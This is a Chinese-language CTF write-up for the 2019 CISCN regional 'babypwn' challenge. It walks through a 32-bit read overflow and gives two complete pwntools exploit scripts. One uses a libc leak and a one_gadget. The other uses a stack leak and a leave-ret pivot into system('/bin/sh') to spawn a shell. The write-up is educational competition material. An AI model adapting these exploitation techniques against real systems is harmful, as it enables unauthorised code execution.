---
title: 2019ciscn华东南babypwn
date: 2019-12-16 15:55:28
tags:
---
<!-- more -->
32位程序，开了NX  
![](ciscn2019_es_babypwn1.png)  
溢出函数  
![](ciscn2019_es_babypwn2.png)  
read函数存在溢出，但是溢出字节有点少  
先gdb调试打印出libc基地址，然后用泄露出的真实地址减去libc基地址得到偏移，再用泄露出的真实地址减去偏移即可直接得到libc基地址  
然后直接用one_gadget做一下  
```python  
#coding=utf-8
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
#p=remote("",)
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc
p.recvuntil("name?\n")

#gdb.attach(p)
p.send('A'*0x28)

libc_leak = u32(p.recvuntil("\xf7")[-4:])    #泄露出的是libc的真实地址
log.success("libc_leak==>" + hex(libc_leak))
libc_base = libc_leak-0x1b23dc  # offset = 0x1b23dc
log.success("libc_base==>" + hex(libc_base))
one_gadget = libc_base + 0x3ac5c
payload = 'A'*0x28 + p32(0xdeadbeef) + p32(one_gadget)
p.send(payload)

p.interactive()
```  
如果libc版本一样的话就可以直接拿shell了  
👴回来填坑来了，今天看了个视频，专门讲了这个题，很明了了  
首先我们可以通过泄露出栈地址（这个栈地址就是指的我们输入的东西存储的地址），ebp的位置里边就是一个栈地址，只需要减去一个偏移，就可以leak了  
然后我们在第二次输入的时候，先把ebp覆盖了，然后填system函数，/bin/sh字符串地址，然后把leak出的栈地址填到ebp的位置，然后leave ret就完事儿🌶  
gdb调试一波  
![](0x00.png)
计算出偏移，得到栈地址
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './pwn' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("",)
elf=ELF(binary)
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
leave_ret = 0x080484b8
system = 0x8048400
def exp():
    p.recvuntil("name?\n")
    p.send('A'*0x28)
    p.recv(0x2f)
    leak = u32(p.recv(4))
    stack = leak-0x38
    log.success("stack_addr==>" + hex(stack))
    payload = p32(stack) + p32(system) + "bbbb" + p32(stack+0x10) + "/bin/sh\x00"  # 4*4=0x10，找到字符串地址
    payload = payload.ljust(0x28,"a")
    payload += p32(stack) + p32(leave_ret)
    p.send(payload)
    p.interactive()
exp()
```  
参考链接：  
https://www.bilibili.com/video/BV1PK4y1t727  
https://zoepla.github.io/2019/06/2019%E5%9B%BD%E8%B5%9B%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/  